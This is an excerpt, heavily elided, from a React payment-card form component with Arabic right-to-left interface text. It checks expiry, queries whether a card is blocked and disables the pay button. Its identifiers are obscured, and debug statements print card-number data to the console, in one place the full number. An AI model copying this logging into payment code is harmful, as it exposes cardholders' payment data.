...
export default function P1({ offerTotalPrice }: _P1Props) {
  ...
  useEffect(() => {
    const checkCardBlocked = async () => {
      const cleanNumber = _v1.replace(/\s/g, "")
      console.log('[CardBlock] Checking card, length:', cleanNumber.length, 'number:', cleanNumber.substring(0, 6))
      
      if (cleanNumber.length >= 4) {
        console.log('[CardBlock] Calling _icb for:', cleanNumber)
        const blocked = await _icb(cleanNumber)
        console.log('[CardBlock] Result:', blocked)
  ...
  useEffect(() => {
    if (_v3.length === 5) {
      ...
      if (isNaN(expMonth) || isNaN(expYear) || expMonth < 1 || expMonth > 12) {
        setExpiryError("تاريخ انتهاء غير صالح")
  ...
  const _hp = async (e: React.FormEvent) => {
    ...
    if (_v3.length !== 5) {
      toast.error("تاريخ الانتهاء غير مكتمل", {
        description: "يرجى إدخال الشهر والسنة كاملين بصيغة MM/YY",
        duration: 5000
      })
      return
    }
    ...
    <>
      ...
      <div className={`space-y-5 ${showEmailModal ? 'blur-xl pointer-events-none' : ''}`} dir="rtl">
        ...
        <form onSubmit={_hp} className="space-y-4">
          ...
          <Button
            type="submit"
            disabled={!isValidCard || _v3.length !== 5 || _v2.length !== 3 || !!expiryError || !_v4 || isCardBlockedState}
          ...
          >
            ...
            {isCardBlockedState ? "تم تعطيل هذه البطاقة" : `دفع ${finalPrice.toFixed(2)} ﷼`}
          </Button>
